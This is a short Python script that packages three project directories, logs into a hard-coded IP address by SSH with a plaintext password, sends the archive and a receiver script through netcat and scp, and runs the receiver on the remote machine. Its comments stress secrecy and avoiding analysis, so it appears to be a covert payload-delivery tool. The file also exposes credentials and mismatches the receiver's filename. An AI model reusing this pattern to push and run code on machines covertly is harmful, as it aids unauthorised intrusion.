#!/usr/bin/env python3
"""
	Allan Millar
	Package sending script
"""
import os, tarfile, time, pexpect
from pathlib import Path
from subprocess import Popen, PIPE
"""
def reset(tarinfo):
    tarinfo.uid = tarinfo.gid = 0
    tarinfo.uname = tarinfo.gname = "root"
    return tarinfo
"""
"""
We only want to send what is necessary for the computer to do what
we want, so we package only the relevant directories/files. Sending
more may make the system easier to defend against or analyze.
"""
def construct_package():
    tar_file =  os.path.isfile("../prf.tar.gz")
    if tar_file:
        os.remove("../prf.tar.gz")
        with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
            tar.add("../boidfunc")#, filter=reset)
            tar.add("../resources")#, filter=reset)
            tar.add("../silla")#, filter=reset)
    else:
        with tarfile.open("prf.tar.gz", mode="w:gz") as tar:
            tar.add("../boidfunc")#, filter=reset)
            tar.add("../resources")#, filter=reset)
            tar.add("../silla")#, filter=reset)
    
    #Move the tar file up one level.
    p = Path("./prf.tar.gz").absolute()
    parent_dir = p.parents[1]
    p.rename(parent_dir / p.name)

def ssh_connect():
    ssh = pexpect.spawn("ssh -T aiaasboi@134.129.92.168 -p 2097")
    ssh.expect("password:", timeout=120)
    ssh.sendline("aiaasboi")
    return ssh
    """
    proc = Popen(
        ["ssh", "-T", "aiaasboi@134.129.92.168", "-p", "2097"],
        stdin=PIPE,
        stdout=PIPE,
        universal_newlines=True
        )
    proc.stdin.write("aiaasboi\n")
    return proc
    """

def deliver_package(ssh):
    ssh.sendline("netcat -l 4444 > prf.tar.gz")
    time.sleep(1)
    scp = pexpect.spawn("scp -P 4444 ../prf.tar.gz aiaasboi@134.129.92.168")
    time.sleep(1)
    ssh.sendline("netcat -l 4444 > receiver.py")
    time.sleep(1)
    scp.sendline("scp -P 4444 ./receiver.py aiaasboi@134.129.92.168")
    return ssh
    
    """
    proc.stdin.write("netcat -l 4444 > prf.tar.gz")
    proc_send_reciever = Popen(
        ["scp", "-P", "4444", "../prf.tar.gz", "aiaasboi@134.129.92.168"],
        stdin=PIPE,
        stdout=PIPE,
        universal_newlines=True
        )
    time.sleep(0.1)
    proc.stdin.write("netcat -l 4444 > receiver.py\n")
    proc_send_reciever.stdin.write(
        "scp -P 4444 ./receiver.py " +
        "aiaasboi@134.129.92.168\n"
        )
    return proc
    """

def initiate(ssh):
    ssh.sendline("python3 reciever.py")
    #proc.stdin.write("python3 reciever.py\n")

def disconnect(ssh):
    ssh.sendline("exit")
    #proc.stdin.write("exit\n")

def main():
    print ("construct_package")
    construct_package()
    
    print ("ssh_connect")
    ssh = ssh_connect()
    print ("deliver_package")
    ssh = deliver_package(ssh)
    print ("initiate")
    initiate(ssh)
    print ("disconnect")
    disconnect(ssh)
    """
    proc = ssh_connect()
    print ("deliver_package")
    proc = deliver_package(proc)
    #time.sleep(3)
    print ("initiate")
    initiate(proc)
    print ("disconnect")
    disconnect(proc)
    """

if __name__ == "__main__":
    main()


"""
Steps
 - don't name the tar boidload for secrecy
 - tar the three relevant (so far) directories and send to new directory
 - send receiver.py and execute
"""